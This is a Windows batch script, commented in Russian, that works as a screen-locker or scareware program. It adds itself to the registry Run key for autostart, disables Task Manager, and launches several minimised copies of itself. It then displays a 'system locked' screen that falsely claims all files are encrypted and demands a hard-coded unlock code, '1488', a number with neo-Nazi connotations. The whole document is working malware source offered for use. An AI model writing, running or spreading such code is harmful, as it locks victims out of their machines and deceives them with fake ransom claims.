@echo off
setlocal enabledelayedexpansion

:: код разблокировки
set "UNLOCK=1488"

:: --- если запущен без аргумента — ставим автозапуск и плодим копии ---
if "%~1"=="" (
    :: автозапуск через реестр
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinLock" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
    :: отключить диспетчер задач
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
    :: запустить себя в цикле (3 копии)
    for /l %%i in (1,1,3) do (
        start "LOCKED" /min cmd /c "\"%~f0\" run"
    )
    exit
)

:: --- основной цикл блокировки ---
mode con cols=120 lines=40
color 0c
title SYSTEM LOCKED

:check
cls
echo.
echo  ============================================================
echo.
echo                    СИСТЕМА ЗАБЛОКИРОВАНА
echo.
echo         все файлы зашифрованы. для разблокировки
echo              введите код и нажмите Enter.
echo.
echo  ============================================================
echo.
set /p code=  Код: 
if "!code!"=="%UNLOCK%" goto unlock
echo.
echo  Неверный код.
timeout /t 2 >nul
goto check

:unlock
:: убрать автозапуск
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinLock" /f >nul 2>&1
:: вернуть диспетчер задач
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f >nul 2>&1
cls
echo.
echo  Код верный. Разблокировка...
timeout /t 1 >nul
exit